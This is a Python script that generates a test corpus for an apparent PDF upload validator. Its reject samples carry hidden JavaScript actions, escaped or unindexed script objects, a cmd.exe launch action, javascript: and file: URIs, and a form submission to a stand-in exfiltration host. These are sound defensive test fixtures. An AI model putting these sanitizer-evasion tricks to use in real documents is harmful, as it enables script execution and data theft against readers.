#!/usr/bin/env python3
"""
Builds the generated part of the PDF corpus. Run from this folder:  python3 generate.py

Every hostile sample is written byte by byte, so it is exactly what it claims to be and nothing
else - no PDF library deciding to "fix" it on the way out. File names follow the corpus rule:
name--reason.pdf, where reason is a phrase from the refusal (or warning) message.

Real-world files (exports from Chrome, macOS, Word and so on) live alongside these in accept/
and are not generated.
"""
import os
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
PAGE = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>"
PAGES = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
CONTENT = b"BT /F1 12 Tf 20 100 Td (Hello) Tj ET"


def classic(objects, root=1, index=None, tail=b"", trailer_extra=b"", header=b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"):
    """objects: list of (number, dictionary bytes, stream bytes or None).
    index: object numbers to list in the xref (default: all). tail: bytes after %%EOF."""
    out = bytearray(header)
    offsets = {}
    for number, body, stream in objects:
        offsets[number] = len(out)
        if stream is None:
            out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
        else:
            out += b"%d 0 obj\n" % number + body.replace(b"%LEN%", str(len(stream)).encode())
            out += b"\nstream\n" + stream + b"\nendstream\nendobj\n"
    listed = sorted(index if index is not None else offsets)
    size = max(offsets) + 1
    xref = len(out)
    out += b"xref\n0 1\n0000000000 65535 f \n"
    for number in listed:
        out += b"%d 1\n%010d 00000 n \n" % (number, offsets[number])
    out += b"trailer\n<< /Size %d /Root %d 0 R " % (size, root) + trailer_extra + b">>\nstartxref\n%d\n%%%%EOF\n" % xref
    return bytes(out) + tail


def with_object_stream(inside, outside=(), listed_inside=None, filter_name=b"/FlateDecode", encode=zlib.compress):
    """Objects in a compressed object stream, indexed by an xref stream.
    inside: list of (number, dictionary bytes). listed_inside: which of them the xref lists."""
    header = b" ".join(b"%d %d" % (n, 0) for n, _ in inside)  # offsets fixed below
    data = b""
    offsets = []
    for _, body in inside:
        offsets.append(len(data))
        data += body + b"\n"
    header = b" ".join(b"%d %d" % (n, o) for (n, _), o in zip(inside, offsets)) + b"\n"
    packed = encode(header + data)

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    numbers = [n for n, _ in inside] + [n for n, _ in outside]
    stm = max(numbers) + 1
    xref_num = stm + 1
    positions = {}
    for number, body in outside:
        positions[number] = len(out)
        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
    positions[stm] = len(out)
    out += (b"%d 0 obj\n<< /Type /ObjStm /N %d /First %d /Filter %s /Length %d >>\nstream\n"
            % (stm, len(inside), len(header), filter_name, len(packed))) + packed + b"\nendstream\nendobj\n"
    positions[xref_num] = len(out)

    listed = set(listed_inside if listed_inside is not None else [n for n, _ in inside])
    rows = b""
    for number in range(xref_num + 1):
        index_in_stream = [n for n, _ in inside].index(number) if number in [n for n, _ in inside] else -1
        if number in listed and index_in_stream >= 0:
            rows += b"\x02" + stm.to_bytes(4, "big") + index_in_stream.to_bytes(2, "big")
        elif number in positions:
            rows += b"\x01" + positions[number].to_bytes(4, "big") + b"\x00\x00"
        else:
            rows += b"\x00" + (0).to_bytes(4, "big") + b"\xff\xff"
    out += (b"%d 0 obj\n<< /Type /XRef /Size %d /W [1 4 2] /Root 1 0 R /Length %d >>\nstream\n"
            % (xref_num, xref_num + 1, len(rows))) + rows + b"\nendstream\nendobj\n"
    out += b"startxref\n%d\n%%%%EOF\n" % positions[xref_num]
    return bytes(out)


def document(catalog_extra=b"", page_extra=b"", extra=(), **kwargs):
    catalog = b"<< /Type /Catalog /Pages 2 0 R " + catalog_extra + b">>"
    page = PAGE[:-2] + page_extra + b" >>"
    return classic([(1, catalog, None), (2, PAGES, None), (3, page, None),
                    (4, b"<< /Length %LEN% >>", CONTENT)] + list(extra), **kwargs)


def write(folder, name, data):
    os.makedirs(os.path.join(HERE, folder), exist_ok=True)
    with open(os.path.join(HERE, folder, name), "wb") as f:
        f.write(data)


inside_clean = [(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (2, PAGES), (3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>")]

# ---------------------------------------------------------------- accept
write("accept", "generated-minimal.pdf", document())
write("accept", "generated-https-link.pdf", document(
    page_extra=b" /Annots [5 0 R]",
    extra=[(5, b"<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] /A << /S /URI /URI (https://example.com/) >> >>", None)]))
write("accept", "generated-mailto-and-goto.pdf", document(
    catalog_extra=b"/OpenAction [3 0 R /Fit] ",
    page_extra=b" /Annots [5 0 R]",
    extra=[(5, b"<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] /A << /S /URI /URI (mailto:hello@example.com) /Next << /S /GoTo /D [3 0 R /Fit] >> >> >>", None)]))
write("accept", "generated-object-stream.pdf", with_object_stream(inside_clean))
# Tagged PDFs use /S for structure types (/P, /H1, /Span). They are not actions.
write("accept", "generated-tagged-structure.pdf", document(
    catalog_extra=b"/MarkInfo << /Marked true >> /StructTreeRoot 5 0 R ",
    extra=[(5, b"<< /Type /StructTreeRoot /K [6 0 R] >>", None),
           (6, b"<< /Type /StructElem /S /Document /K [7 0 R] >>", None),
           (7, b"<< /Type /StructElem /S /P /Pg 3 0 R /K 0 >>", None)]))

# ---------------------------------------------------------------- reject
write("reject", "openaction-javascript--contains-JavaScript.pdf", document(
    catalog_extra=b"/OpenAction 5 0 R ",
    extra=[(5, b"<< /Type /Action /S /JavaScript /JS (app.alert\\(1\\)) >>", None)]))
write("reject", "escaped-name-in-object-stream--contains-JavaScript.pdf", with_object_stream([
    (1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>"), (2, PAGES),
    (3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"),
    (4, b"<< /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>")]))
write("reject", "launch-in-object-stream--launches-a-program.pdf", with_object_stream([
    (1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>"), (2, PAGES),
    (3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"),
    (4, b"<< /S /Launch /F (cmd.exe) >>")]))
# Method 2 only: the object stream holding the script is listed nowhere in the index.
write("reject", "javascript-in-unindexed-object-stream--contains-JavaScript.pdf", with_object_stream(
    inside_clean + [(4, b"<< /S /J#61vaScript /JS (app.alert\\(1\\)) >>")], listed_inside=[1, 2, 3]))
write("reject", "javascript-after-eof--contains-JavaScript.pdf", document(
    tail=b"9 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\)) >>\nendobj\n"))
write("reject", "link-annotation-javascript--contains-JavaScript.pdf", document(
    page_extra=b" /Annots [5 0 R]",
    extra=[(5, b"<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] /A << /S /JavaScript /JS 6 0 R >> >>", None),
           (6, b"<< /Length %LEN% >>", b"app.alert(1)")]))
write("reject", "page-open-additional-action--contains-JavaScript.pdf", document(
    page_extra=b" /AA << /O 5 0 R >>",
    extra=[(5, b"<< /S /JavaScript /JS (app.alert\\(1\\)) >>", None)]))
write("reject", "javascript-name-tree--contains-JavaScript.pdf", document(
    catalog_extra=b"/Names << /JavaScript << /Names [(x) 5 0 R] >> >> ",
    extra=[(5, b"<< /S /JavaScript /JS (app.alert\\(1\\)) >>", None)]))
write("reject", "next-chain-to-javascript--contains-JavaScript.pdf", document(
    catalog_extra=b"/OpenAction << /S /GoTo /D [3 0 R /Fit] /Next 5 0 R >> ",
    extra=[(5, b"<< /S /J#61vaScript /JS (app.alert\\(1\\)) >>", None)]))
write("reject", "uri-javascript-scheme--other-than-a-web.pdf", document(
    catalog_extra=b"/OpenAction << /S /URI /URI (javascript:alert\\(1\\)) >> "))
write("reject", "uri-tab-in-scheme--other-than-a-web.pdf", document(
    catalog_extra=b"/OpenAction << /S /URI /URI (java\\tscript:alert\\(1\\)) >> "))
write("reject", "uri-hex-string-javascript--other-than-a-web.pdf", document(
    catalog_extra=b"/OpenAction << /S /URI /URI <" + b"javascript:alert(1)".hex().encode() + b"> >> "))
write("reject", "uri-file-scheme--other-than-a-web.pdf", document(
    catalog_extra=b"/OpenAction << /S /URI /URI (file:///C:/Windows/System32/calc.exe) >> "))
write("reject", "submit-form--submits-form-data.pdf", document(
    catalog_extra=b"/OpenAction << /S /SubmitForm /F (https://evil.test/collect) >> "))
write("reject", "remote-goto--opens-another-PDF.pdf", document(
    catalog_extra=b"/OpenAction << /S /GoToR /F (other.pdf) /D [0 /Fit] >> "))
write("reject", "unknown-action-type--not-allowed.pdf", document(
    catalog_extra=b"/OpenAction << /S /SomethingNew >> "))
write("reject", "embedded-file--attached-file.pdf", document(
    catalog_extra=b"/Names << /EmbeddedFiles << /Names [(a.exe) 5 0 R] >> >> ",
    extra=[(5, b"<< /Type /Filespec /F (a.exe) /EF << /F 6 0 R >> >>", None),
           (6, b"<< /Type /EmbeddedFile /Length %LEN% >>", b"MZ")]))
write("reject", "file-attachment-annotation--attached-file.pdf", document(
    page_extra=b" /Annots [5 0 R]",
    extra=[(5, b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 20 20] /FS << /Type /Filespec /F (a.txt) >> >>", None)]))
write("reject", "xfa-form--XFA-form.pdf", document(
    catalog_extra=b"/AcroForm << /Fields [] /XFA 5 0 R >> ",
    extra=[(5, b"<< /Length %LEN% >>", b"<xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'/>")]))
write("reject", "encrypted--encrypted.pdf", document(
    trailer_extra=b"/Encrypt << /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >> /ID [<01><01>] "))
write("reject", "html-renamed-pdf--PDF-header.pdf",
      b"<html><body><script>alert(document.domain)</script></body></html>")
write("reject", "content-before-header--PDF-header.pdf",
      b"<html><!--\n" + document())
write("reject", "unreadable-object-stream--cannot-be-decompressed.pdf", with_object_stream(
    inside_clean, filter_name=b"/LZWDecode", encode=lambda b: b"\x80\x0b\x60\x50\x22\x0c\x0c\x85\x01"))

# ---------------------------------------------------------------- warn
# A clean object outside the index: what an editor's incremental save leaves behind.
write("warn", "clean-leftover-object--leftover-object.pdf", document(
    extra=[(9, b"<< /Producer (An earlier version) >>", None)], index=[1, 2, 3, 4]))

write("warn", "clean-leftover-in-unindexed-object-stream--leftover-object.pdf", with_object_stream(
    inside_clean + [(4, b"<< /Producer (An earlier version) >>")], listed_inside=[1, 2, 3]))

# A /Next chain that points back at itself must end, not hang the upload.
write("accept", "generated-next-chain-loop.pdf", document(
    catalog_extra=b"/OpenAction 5 0 R ",
    extra=[(5, b"<< /S /GoTo /D [3 0 R /Fit] /Next 6 0 R >>", None),
           (6, b"<< /S /GoTo /D [3 0 R /Fit] /Next 5 0 R >>", None)]))

print("generated")
